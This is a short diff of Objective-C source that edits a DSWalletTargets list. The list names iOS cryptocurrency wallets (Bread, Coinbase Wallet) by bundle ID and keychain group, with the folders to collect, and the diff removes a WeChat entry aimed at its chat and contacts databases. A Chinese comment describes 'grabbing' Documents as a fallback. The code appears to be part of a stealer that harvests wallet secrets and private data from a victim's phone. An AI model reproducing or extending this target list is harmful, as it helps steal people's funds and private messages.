@@ -430,9 +430,6 @@ static NSArray<NSDictionary *> *DSWalletTargets(void)
         @{@"type": @"bread", @"bundleId": @"com.vilcsak.bitcoin2",
           @"keychainGroup": @"3W8D3S7TCY.com.vilcsak.bitcoin2",
           @"dirs": @[@"Documents"]},
-        @{@"type": @"wechat", @"bundleId": @"com.tencent.xin",
-          @"keychainGroup": @"532LCLCWL8.com.tencent.xin",
-          @"files": @[@"ChatStorage.sqlite", @"ContactsV2.sqlite"]},
 
         // === fox Reward 只给了 keychain 组、无具体文件路径的钱包，兜底抓 Documents ===
         @{@"type": @"coinbase", @"bundleId": @"org.coinbase.wallet",
